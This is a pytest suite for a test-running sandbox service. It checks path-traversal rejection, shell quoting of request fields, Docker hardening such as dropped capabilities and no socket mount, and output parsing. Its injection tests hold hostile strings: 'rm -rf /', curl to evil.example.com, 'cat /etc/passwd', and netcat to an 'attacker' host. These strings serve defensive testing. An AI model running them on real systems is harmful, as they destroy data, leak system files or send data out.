"""执行沙箱测试：路径防护、命令构造、输出解析、Docker 安全配置。

Docker daemon 在本机不可用，因此 Docker 后端的行为通过**直接断言容器创建参数**
来验证——这反而更精确：安全边界的全部内容就是那组参数。
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

from app.core.config import DockerSettings
from app.services.sandbox import (
    COVERAGE_JSON_NAME,
    DockerSandboxRunner,
    LocalSubprocessSandboxRunner,
    SandboxPathError,
    SandboxRunRequest,
    build_local_commands,
    build_pytest_script,
    docker_available,
    parse_coverage_json,
    parse_pytest_summary,
    resolve_workspace,
)


@pytest.fixture()
def docker_settings(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> DockerSettings:
    """把沙箱工作区指向临时目录的配置。"""
    monkeypatch.setenv("DOCKER__WORKSPACE_DIR", str(tmp_path / "workspaces"))
    from app.core.config import get_settings

    get_settings.cache_clear()
    settings = get_settings().docker
    settings.workspace_path.mkdir(parents=True, exist_ok=True)
    yield settings
    get_settings.cache_clear()


# ---------------------------------------------------------------------------
# 路径防护（API 最重要的安全边界）
# ---------------------------------------------------------------------------
def test_resolve_workspace_accepts_relative_path(docker_settings: DockerSettings) -> None:
    target = docker_settings.workspace_path / "job1" / "sandbox_repo"
    target.mkdir(parents=True)
    assert resolve_workspace(docker_settings, "job1/sandbox_repo") == target.resolve()


def test_resolve_workspace_accepts_absolute_path_inside(docker_settings: DockerSettings) -> None:
    target = docker_settings.workspace_path / "job2"
    target.mkdir(parents=True)
    assert resolve_workspace(docker_settings, target) == target.resolve()


def test_resolve_workspace_accepts_root_itself(docker_settings: DockerSettings) -> None:
    assert resolve_workspace(docker_settings, docker_settings.workspace_path) == (
        docker_settings.workspace_path.resolve()
    )


@pytest.mark.parametrize(
    "candidate",
    [
        "../",
        "../../",
        "../secrets",
        "job/../../outside",
        "../../../../../../etc",
    ],
)
def test_resolve_workspace_rejects_traversal(
    docker_settings: DockerSettings, candidate: str
) -> None:
    """目录穿越必须被拦下——否则调用方可让服务读取宿主机任意目录。"""
    with pytest.raises(SandboxPathError, match="越界|不存在"):
        resolve_workspace(docker_settings, candidate)


def test_resolve_workspace_rejects_absolute_path_outside(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    with pytest.raises(SandboxPathError):
        resolve_workspace(docker_settings, outside)


def test_resolve_workspace_rejects_symlink_escape(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    """软链接绕过必须被拦下（resolve() 会展开链接）。"""
    outside = tmp_path / "real_outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("top secret", encoding="utf-8")

    link = docker_settings.workspace_path / "escape"
    try:
        link.symlink_to(outside, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("当前环境不支持创建符号链接")

    with pytest.raises(SandboxPathError):
        resolve_workspace(docker_settings, "escape")


def test_resolve_workspace_rejects_missing_path(docker_settings: DockerSettings) -> None:
    with pytest.raises(SandboxPathError, match="不存在"):
        resolve_workspace(docker_settings, "nope")


def test_resolve_workspace_rejects_file(docker_settings: DockerSettings) -> None:
    target = docker_settings.workspace_path / "file.txt"
    target.write_text("x", encoding="utf-8")
    with pytest.raises(SandboxPathError, match="不是目录"):
        resolve_workspace(docker_settings, "file.txt")


# ---------------------------------------------------------------------------
# 命令构造与注入防护
# ---------------------------------------------------------------------------
def test_pytest_script_runs_coverage_and_preserves_exit_code() -> None:
    script = build_pytest_script(
        test_target="tests", coverage_enabled=True, workspace_mount="/workspace"
    )
    assert "coverage run" in script
    assert "coverage json" in script
    # 测试失败也要产出覆盖率，但退出码必须是 pytest 的
    assert "PYTEST_EXIT=$?" in script
    assert "exit $PYTEST_EXIT" in script
    assert "no:cacheprovider" in script


def test_pytest_script_without_coverage() -> None:
    script = build_pytest_script(
        test_target="tests", coverage_enabled=False, workspace_mount="/workspace"
    )
    assert "coverage" not in script
    assert "pytest" in script


def test_pytest_script_installs_dependencies_when_requested() -> None:
    script = build_pytest_script(
        test_target="tests",
        coverage_enabled=True,
        workspace_mount="/workspace",
        install_dependencies=True,
    )
    assert "pip install" in script
    assert "__SANDBOX_SETUP_FAILED__" in script


def test_pytest_script_omits_install_by_default() -> None:
    script = build_pytest_script(
        test_target="tests", coverage_enabled=True, workspace_mount="/workspace"
    )
    assert "pip install" not in script


@pytest.mark.parametrize(
    "evil",
    [
        "tests; rm -rf /",
        "tests && curl http://evil.example.com",
        "tests' ; cat /etc/passwd ; '",
        "tests$(whoami)",
        "tests`id`",
        "tests | nc attacker 1234",
    ],
)
def test_test_target_is_shell_quoted(evil: str) -> None:
    """test_target 来自请求，必须防命令注入。"""
    script = build_pytest_script(
        test_target=evil, coverage_enabled=False, workspace_mount="/workspace"
    )
    line = next(item for item in script.splitlines() if "pytest" in item)
    # 危险字符必须落在单引号内部，而不是被 shell 解释
    assert f"'{evil}'" in line or evil.replace("'", "'\"'\"'") in line
    # 不应出现未包裹的分号执行
    assert not line.strip().endswith("rm -rf /")


def test_pip_index_url_is_quoted() -> None:
    script = build_pytest_script(
        test_target="tests",
        coverage_enabled=True,
        workspace_mount="/workspace",
        install_dependencies=True,
        pip_index_url="https://mirror.example.com/simple",
    )
    assert "'https://mirror.example.com/simple'" in script


def test_local_commands_use_no_shell() -> None:
    """本地后端用参数列表而非 shell 字符串，天然免疫命令注入。"""
    commands = build_local_commands(
        test_target="tests", coverage_enabled=True, executable=sys.executable
    )
    assert len(commands) == 2
    assert commands[0][:3] == [sys.executable, "-m", "coverage"]
    assert "run" in commands[0]
    assert commands[1][1:3] == ["-m", "coverage"]
    assert "json" in commands[1]


# ---------------------------------------------------------------------------
# Docker 容器安全配置（无需 daemon 即可验证安全边界）
# ---------------------------------------------------------------------------
def _docker_kwargs(settings: DockerSettings, workspace: Path) -> dict:
    runner = DockerSandboxRunner(settings)
    request = SandboxRunRequest(workspace=workspace, test_target="tests")
    return runner._container_kwargs(request, "echo hi")


def test_docker_never_mounts_docker_socket(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    """挂载 docker.sock 等于把宿主机 root 交给容器——最高危的逃逸途径。"""
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    mounts = " ".join(kwargs["volumes"].keys())
    assert "docker.sock" not in mounts
    assert "/var/run" not in mounts
    # 只应挂载请求的那一个目录
    assert len(kwargs["volumes"]) == 1


def test_docker_only_mounts_requested_workspace(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    workspace = tmp_path / "job"
    workspace.mkdir()
    kwargs = _docker_kwargs(docker_settings, workspace)
    assert str(workspace) in kwargs["volumes"]
    mode = kwargs["volumes"][str(workspace)]
    assert mode["bind"] == docker_settings.workspace_mount
    assert mode["mode"] == "rw"


def test_docker_drops_privileges(docker_settings: DockerSettings, tmp_path: Path) -> None:
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    assert kwargs["privileged"] is False
    assert kwargs["cap_drop"] == ["ALL"]
    assert "no-new-privileges:true" in kwargs["security_opt"]


def test_docker_resource_limits(docker_settings: DockerSettings, tmp_path: Path) -> None:
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    assert kwargs["mem_limit"] == docker_settings.memory_limit
    assert kwargs["nano_cpus"] == int(docker_settings.cpu_limit * 1_000_000_000)
    # pids_limit 是防 fork 炸弹的关键
    assert kwargs["pids_limit"] == docker_settings.pids_limit


def test_docker_read_only_rootfs_with_writable_tmp(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    if docker_settings.read_only_root:
        assert kwargs["read_only"] is True
        assert "/tmp" in kwargs["tmpfs"]


def test_docker_does_not_use_host_namespaces(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    """绝不能用 host 的 pid/network/ipc/userns 命名空间。"""
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    for key in ("pid_mode", "ipc_mode", "userns_mode", "uts_mode"):
        assert kwargs.get(key) in (None, "")
    assert kwargs.get("network_mode") != "host"


def test_docker_network_disabled_when_no_install(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    docker_settings.install_dependencies = False
    docker_settings.network_disabled = True
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    assert kwargs["network_disabled"] is True


def test_docker_network_opened_only_for_dependency_install(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    """安装依赖必须联网，此时网络隔离实际不生效——不能假装它是开的。"""
    docker_settings.install_dependencies = True
    docker_settings.network_disabled = True
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    assert kwargs["network_disabled"] is False


def test_docker_auto_remove_is_off_so_logs_survive(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    """auto_remove 会让容器在读取日志/退出码前消失，必须由我们自己删。"""
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    assert kwargs["auto_remove"] is False
    assert kwargs["labels"][DockerSandboxRunner.ORPHAN_LABEL] == "true"


def test_docker_marks_containers_for_orphan_cleanup(
    docker_settings: DockerSettings, tmp_path: Path
) -> None:
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    assert DockerSandboxRunner.ORPHAN_LABEL in kwargs["labels"]


def test_docker_env_is_deterministic(docker_settings: DockerSettings, tmp_path: Path) -> None:
    kwargs = _docker_kwargs(docker_settings, tmp_path)
    assert kwargs["environment"]["PYTHONHASHSEED"] == "0"
    assert kwargs["environment"]["PYTHONDONTWRITEBYTECODE"] == "1"


# ---------------------------------------------------------------------------
# 输出解析
# ---------------------------------------------------------------------------
def test_parse_pytest_summary_counts_states() -> None:
    counts = parse_pytest_summary("=== 1 failed, 2 passed, 1 skipped, 1 warning in 0.12s ===")
    assert counts["failed"] == 1
    assert counts["passed"] == 2
    assert counts["skipped"] == 1


def test_parse_pytest_summary_handles_errors() -> None:
    counts = parse_pytest_summary("2 errors, 1 passed in 0.5s")
    assert counts["errors"] == 2
    assert counts["passed"] == 1


def test_parse_pytest_summary_all_passed() -> None:
    assert parse_pytest_summary("5 passed in 0.30s")["passed"] == 5


def test_parse_pytest_summary_on_empty_output() -> None:
    counts = parse_pytest_summary("")
    assert counts == {"passed": 0, "failed": 0, "errors": 0, "skipped": 0}


def test_parse_coverage_json(tmp_path: Path) -> None:
    payload = {
        "meta": {"version": "7.0"},
        "files": {
            "pkg/core.py": {
                "summary": {
                    "covered_lines": 8,
                    "num_statements": 10,
                    "percent_covered": 80.0,
                    "missing_lines": 2,
                }
            },
            "pkg/util.py": {
                "summary": {
                    "covered_lines": 3,
                    "num_statements": 6,
                    "percent_covered": 50.0,
                    "missing_lines": 3,
                }
            },
        },
        "totals": {
            "covered_lines": 11,
            "num_statements": 16,
            "percent_covered": 68.75,
            "missing_lines": 5,
        },
    }
    path = tmp_path / COVERAGE_JSON_NAME
    path.write_text(json.dumps(payload), encoding="utf-8")

    summary = parse_coverage_json(path)
    assert summary is not None
    assert summary.percent_covered == pytest.approx(68.75)
    assert summary.covered_lines == 11
    assert summary.missing_lines == 5
    assert len(summary.files) == 2
    # 缺失行多的排在前面，便于定位薄弱点
    assert summary.files[0].path == "pkg/util.py"
    assert summary.to_dict()["file_count"] == 2


def test_parse_coverage_json_missing_or_corrupt(tmp_path: Path) -> None:
    assert parse_coverage_json(tmp_path / "nope.json") is None
    bad = tmp_path / "bad.json"
    bad.write_text("{not json", encoding="utf-8")
    assert parse_coverage_json(bad) is None


# ---------------------------------------------------------------------------
# 后端探测
# ---------------------------------------------------------------------------
def test_docker_available_returns_false_without_daemon() -> None:
    """本机没有 Docker，探测必须返回 False 而不是抛异常。"""
    assert docker_available() is False


async def test_local_runner_probe_warns_about_no_isolation(
    docker_settings: DockerSettings,
) -> None:
    availability = await LocalSubprocessSandboxRunner(docker_settings).probe()
    assert availability.backend == "local"
    assert availability.docker_available is False
    assert availability.warnings
    assert any("隔离" in item for item in availability.warnings)


async def test_docker_runner_probe_reports_unavailable(
    docker_settings: DockerSettings,
) -> None:
    availability = await DockerSandboxRunner(docker_settings).probe()
    assert availability.docker_available is False
    assert availability.backend is None
    assert availability.reason


# ---------------------------------------------------------------------------
# 本地后端真实执行
# ---------------------------------------------------------------------------
@pytest.fixture()
def sandbox_job(tmp_path: Path, docker_settings: DockerSettings) -> Path:
    """在沙箱工作区内准备一个可执行的测试目录。"""
    job = docker_settings.workspace_path / "job"
    tests = job / "tests"
    tests.mkdir(parents=True)
    (job / "calc.py").write_text(
        "def add(a, b):\n    return a + b\n", encoding="utf-8"
    )
    (tests / "test_calc.py").write_text(
        "from calc import add\n\n\ndef test_add():\n    assert add(1, 2) == 3\n",
        encoding="utf-8",
    )
    return job


async def test_local_runner_executes_passing_tests(
    docker_settings: DockerSettings, sandbox_job: Path
) -> None:
    runner = LocalSubprocessSandboxRunner(docker_settings)
    result = await runner.run(
        SandboxRunRequest(workspace=sandbox_job, test_target="tests", coverage_enabled=True)
    )

    assert result.backend == "local"
    assert result.exit_code == 0, result.stderr
    assert result.succeeded is True
    assert result.passed == 1
    assert result.failed == 0
    assert result.timed_out is False
    assert result.duration_ms > 0
    assert result.notes and "无隔离" in result.notes[0]


async def test_local_runner_collects_coverage(
    docker_settings: DockerSettings, sandbox_job: Path
) -> None:
    runner = LocalSubprocessSandboxRunner(docker_settings)
    result = await runner.run(
        SandboxRunRequest(workspace=sandbox_job, test_target="tests", coverage_enabled=True)
    )

    assert result.coverage is not None
    assert result.coverage.num_statements > 0
    assert 0.0 <= result.coverage.percent_covered <= 100.0
    # 覆盖率报告应落在工作目录里，供宿主机读取
    assert (sandbox_job / COVERAGE_JSON_NAME).exists()


async def test_local_runner_reports_failures(
    docker_settings: DockerSettings, sandbox_job: Path
) -> None:
    (sandbox_job / "tests" / "test_calc.py").write_text(
        "from calc import add\n\n\ndef test_bad():\n    assert add(1, 2) == 999\n",
        encoding="utf-8",
    )
    runner = LocalSubprocessSandboxRunner(docker_settings)
    result = await runner.run(
        SandboxRunRequest(workspace=sandbox_job, test_target="tests", coverage_enabled=False)
    )

    assert result.exit_code != 0
    assert result.succeeded is False
    assert result.failed == 1
    assert result.tests_failed is True


async def test_local_runner_handles_collection_error(
    docker_settings: DockerSettings, sandbox_job: Path
) -> None:
    """测试文件本身报错（导入失败）应被识别为 error，而不是静默成功。"""
    (sandbox_job / "tests" / "test_broken.py").write_text(
        "import does_not_exist_xyz\n", encoding="utf-8"
    )
    runner = LocalSubprocessSandboxRunner(docker_settings)
    result = await runner.run(
        SandboxRunRequest(workspace=sandbox_job, test_target="tests", coverage_enabled=False)
    )

    assert result.exit_code != 0
    assert result.errors >= 1


async def test_local_runner_rejects_custom_command(
    docker_settings: DockerSettings, sandbox_job: Path
) -> None:
    """本地后端无隔离，接受任意命令等于暴露宿主机 shell。"""
    from app.services.sandbox import SandboxCommandError

    runner = LocalSubprocessSandboxRunner(docker_settings)
    with pytest.raises(SandboxCommandError, match="不允许自定义命令"):
        await runner.run(
            SandboxRunRequest(
                workspace=sandbox_job, test_target="tests", command=["rm", "-rf", "/"]
            )
        )


async def test_local_runner_times_out(
    docker_settings: DockerSettings, sandbox_job: Path
) -> None:
    (sandbox_job / "tests" / "test_slow.py").write_text(
        "import time\n\n\ndef test_slow():\n    time.sleep(30)\n", encoding="utf-8"
    )
    runner = LocalSubprocessSandboxRunner(docker_settings)
    result = await runner.run(
        SandboxRunRequest(
            workspace=sandbox_job,
            test_target="tests",
            coverage_enabled=False,
            timeout_seconds=3,
        )
    )

    assert result.timed_out is True
    assert result.exit_code == -1
    assert result.succeeded is False


async def test_local_runner_truncates_huge_output(
    docker_settings: DockerSettings, sandbox_job: Path
) -> None:
    docker_settings.max_output_bytes = 500
    # 用超长断言消息产生大量输出：pytest 默认捕获 print，但失败报告会写入 stdout
    (sandbox_job / "tests" / "test_noisy.py").write_text(
        "def test_noisy():\n    assert False, 'x' * 5000\n", encoding="utf-8"
    )
    runner = LocalSubprocessSandboxRunner(docker_settings)
    result = await runner.run(
        SandboxRunRequest(workspace=sandbox_job, test_target="tests", coverage_enabled=False)
    )

    assert result.truncated is True
    assert "输出已截断" in result.stdout
